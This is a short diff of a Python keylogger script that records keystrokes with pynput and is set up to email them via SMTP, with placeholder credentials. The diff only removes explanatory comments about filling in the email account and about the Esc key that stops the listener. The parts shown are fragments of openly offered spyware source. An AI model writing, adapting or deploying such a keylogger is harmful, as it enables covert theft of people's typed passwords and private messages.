@@ -1,9 +1,8 @@
 from pynput import keyboard
 import smtplib,ssl
-sender_mail = "user@domain.com"     # Replace user@domain.com with your email id (everywhere)
-#prefer using your own email id for receiver's as well.
-receiver_mail = "user@domain.com"  # Replace user@domain.com with your email id (everywhere)
-password = "passcode"              # Enter your Password here
+sender_mail = "user@domain.com"    
+receiver_mail = "user@domain.com" 
+password = "passcode"             
 port = 587
 message = """From: user@domain.com
 To: user@domain.com                         
@@ -37,8 +36,7 @@ def on_key_press(Key):
             print("\n{} Pressed\n".format(Key))
 
 def on_key_release(Key):
-    #This stops the Listener/Keylogger.
-    #You can use any key you like by replacing "esc" with the key of your choice
+    
     if(Key == keyboard.Key.esc):
         return False
 
